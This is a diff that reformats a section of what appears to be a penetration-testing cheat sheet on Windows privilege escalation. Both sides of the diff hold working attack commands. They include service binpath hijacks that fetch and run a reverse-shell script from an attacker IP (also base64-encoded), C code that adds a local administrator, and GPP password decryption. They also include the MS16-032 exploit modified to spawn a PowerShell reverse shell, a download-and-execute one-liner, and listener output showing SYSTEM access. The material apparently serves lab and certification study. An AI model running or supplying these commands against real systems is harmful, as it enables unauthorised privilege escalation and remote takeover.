@@ -2205,119 +2157,110 @@ Prior to successfully performing a Windows run as, we of course need a valid win
 ### Others
 
 - Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user.  
-    `icacls scsiaccess.exe`
+    - `icacls scsiaccess.exe`
 
-      ```text
-      scsiaccess.exe  
-      NT AUTHORITY\SYSTEM:(I)(F)  
-      BUILTIN\Administrators:(I)(F)  
-      BUILTIN\Users:(I)(RX)  
-      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
-      Everyone:(I)(F)
-      ```
+    ```text
+    scsiaccess.exe  
+    NT AUTHORITY\SYSTEM:(I)(F)  
+    BUILTIN\Administrators:(I)(F)  
+    BUILTIN\Users:(I)(RX)  
+    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
+    Everyone:(I)(F)
+    ```
 
-  - If for example, service `UsoSvc` is having **AllAccess, Start** set, you can change the binary path to execute what we want:
-    - First stop the service via
-        `sc.exe stop UsoSvc`
-    - Second, change the binary path of the service via the command. _In this case, my reverse shell was of nishang and would autoexecute within powershell to create a reverse shell_!
-        `sc.exe config UsoSvc binpath="powershell.exe 'IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)'"`
-    - Last, start the service:
-        `sc.exe start UsoSvc`
+- If for example, service `UsoSvc` is having **AllAccess, Start** set, you can change the binary path to execute what we want:
+  - First stop the service via `sc.exe stop UsoSvc`
+  - Second, change the binary path of the service via the command. _In this case, my reverse shell was of nishang and would autoexecute within powershell to create a reverse shell_!
+    - `sc.exe config UsoSvc binpath="powershell.exe 'IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)'"`
+  - Last, start the service: `sc.exe start UsoSvc`
 
-      **If this method doesn't work, change the command to base64 little endian sometimes it works!**
-      `echo "IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0`
-      `sc.exe config UsoSvc binpath="powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
-      Or
-      `sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
+    **If this method doesn't work, change the command to base64 little endian sometimes it works!**
+    - `echo "IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0`
+    - `sc.exe config UsoSvc binpath="powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
+    Or
+    - `sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
 
 - Compile a custom add user command in windows using C  
 
-      ```
-      root@kali:~# cat useradd.c  
-      #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
-      int main ()  
-      {  
-      int i;  
-      i=system ("net localgroup administrators low /add");  
-      return 0;  
-      }
-      ```  
+  ```shell
+  root@kali:~# cat useradd.c  
+  #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
+  int main ()  
+  {  
+  int i;  
+  i=system ("net localgroup administrators low /add");  
+  return 0;  
+  }
+  ```  
 
-      `i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`
+    - `i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`
 
-- Group Policy Preferences (GPP)  
-    A common useful misconfiguration found in modern domain environments
-    is unprotected Windows GPP settings files
+- Group Policy Preferences (GPP) 
 
+A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files
   - map the Domain controller SYSVOL share  
-
-        `net use z:\\dc01\SYSVOL`
-
+    - `net use z:\\dc01\SYSVOL`
   - Find the GPP file: Groups.xml  
-
-        `dir /s Groups.xml`
-
+    - `dir /s Groups.xml`
   - Review the contents for passwords  
-
-        `type Groups.xml`
-
+    - `type Groups.xml`
   - Decrypt using GPP Decrypt  
-
-        `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
-
+    - `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
 - Find and display the proof.txt or flag.txt - get the loot!
-
-    `#meterpreter  >     run  post/windows/gather/win_privs`
-    `cd\ & dir /b /s proof.txt`
-    `type c:\pathto\proof.txt`
+    
+    ```shell
+    #meterpreter>run  post/windows/gather/win_privs
+    cd\ & dir /b /s proof.txt
+    type c:\pathto\proof.txt
+    ```
 
 ### Windows Kernel Exploit (MS16-032)
 
 If the remote machine appears to be vulnerable to MS16-032, we can execute a powershell script from a remote server to exploit it.
 
-```shell
-Title      : Secondary Logon Handle
-MSBulletin : MS16-032
-CVEID      : 2016-0099
-Link       : https://www.exploit-db.com/exploits/39719/
-VulnStatus : Appears Vulnerable
-```
+  ```shell
+  Title      : Secondary Logon Handle
+  MSBulletin : MS16-032
+  CVEID      : 2016-0099
+  Link       : https://www.exploit-db.com/exploits/39719/
+  VulnStatus : Appears Vulnerable
+  ```
 
 Get the Powershell script from FuzzySecurity's Github, add an invoke to the end of the script and share the folder using the python SimpleHTTPServer:
 
-```shell
-root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git
-Cloning into 'PowerShell-Suite'...
-remote: Enumerating objects: 378, done.
-remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378
-Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done.
-Resolving deltas: 100% (179/179), done.
-root@kali:~test# cd PowerShell-Suite/
-root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 >> Invoke-MS16-032.ps1 
-root@kali:~test/PowerShell-Suite# python -m Simple
-SimpleDialog        SimpleHTTPServer    SimpleXMLRPCServer  
-root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80
-```
+  ```shell
+  root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git
+  Cloning into 'PowerShell-Suite'...
+  remote: Enumerating objects: 378, done.
+  remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378
+  Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done.
+  Resolving deltas: 100% (179/179), done.
+  root@kali:~test# cd PowerShell-Suite/
+  root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 >> Invoke-MS16-032.ps1 
+  root@kali:~test/PowerShell-Suite# python -m Simple
+  SimpleDialog        SimpleHTTPServer    SimpleXMLRPCServer  
+  root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80
+  ```
 
 The default version of the MS16-032 script will create a Pop-up CMD.exe window on the remote machine. Unfortunatly, we cannot access this from a limited shell... BUT we can modify the exploit to call a reverse shell. Its pretty easy to modify it to call a reverse powershell that will connect back to our machine with a System shell. We will need to modify line 330 of the exploit (the ip address and port will need to be updated of course):
 
-```powershell
-# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
-#$CallResult = [Advapi32]::CreateProcessWithLogonW(
-#    "user", "domain", "pass",
-#    0x00000002, "C:\Windows\System32\cmd.exe", "",
-#    0x00000004, $null, $GetCurrentPath,
-#    [ref]$StartupInfo, [ref]$ProcessInfo)
+  ```powershell
+  # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
+  #$CallResult = [Advapi32]::CreateProcessWithLogonW(
+  #    "user", "domain", "pass",
+  #    0x00000002, "C:\Windows\System32\cmd.exe", "",
+  #    0x00000004, $null, $GetCurrentPath,
+  #    [ref]$StartupInfo, [ref]$ProcessInfo)
 
-# Modified to create a Powershell reverse shell 
-$CallResult = [Advapi32]::CreateProcessWithLogonW(
-    "user", "domain", "pass",
-    0x00000002, 
-    'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 
-    '-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
-    0x00000004, $null, $GetCurrentPath,
-    [ref]$StartupInfo, [ref]$ProcessInfo)
-```
+  # Modified to create a Powershell reverse shell 
+  $CallResult = [Advapi32]::CreateProcessWithLogonW(
+      "user", "domain", "pass",
+      0x00000002, 
+      'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 
+      '-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
+      0x00000004, $null, $GetCurrentPath,
+      [ref]$StartupInfo, [ref]$ProcessInfo)
+  ```
 
 - On the remote host execute the exploit:
   `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"`
@@ -2330,14 +2273,14 @@ $CallResult = [Advapi32]::CreateProcessWithLogonW(
 
 On our Kali machine we create the reverse shell and ... BOOM! Root dance.
 
-```shell
-root@kali:~# nc -nlvp 4444
-listening on [any] 4444 ...
-connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182
+  ```shell
+  root@kali:~# nc -nlvp 4444
+  listening on [any] 4444 ...
+  connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182
 
-PS C:\Users\jimmy^> whoami
-nt authority\system
-```
+  PS C:\Users\jimmy^> whoami
+  nt authority\system
+  ```
 
 ### Potato Attacks
 
